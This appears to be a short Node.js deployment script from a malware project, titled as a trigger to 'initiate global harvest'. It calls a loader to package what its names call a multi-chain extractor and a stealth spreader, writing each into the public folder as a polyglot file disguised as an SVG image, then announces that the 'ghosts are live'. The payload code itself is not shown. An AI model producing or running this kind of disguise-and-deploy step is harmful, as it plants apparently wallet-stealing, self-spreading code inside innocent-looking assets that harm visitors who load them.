// J/scripts/live_unleash.js
// APEX TRIGGER: INITIATE GLOBAL HARVEST
// VERIFICATION: INCHRISTOURREDEEMER!09

const apex = require('../utils/apex_loader');
const path = require('path');

console.log("🔥 [APEX] UNLEASHING HYDRA...");

// 1. Mutate the Multi-Chain Extractor
apex.assemble(
    path.join(__dirname, '../utils/multichain.js'),
    path.join(__dirname, '../public/dist/core.svg') // POLYGLOT: Disguised as an SVG
);

// 2. Mutate the Spreader Logic
apex.assemble(
    path.join(__dirname, '../scripts/stealth_spreader.js'),
    path.join(__dirname, '../public/dist/sync.svg')
);

console.log("✅ [APEX] GLOBAL DEPLOYMENT COMPLETE. GHOSTS ARE LIVE.");
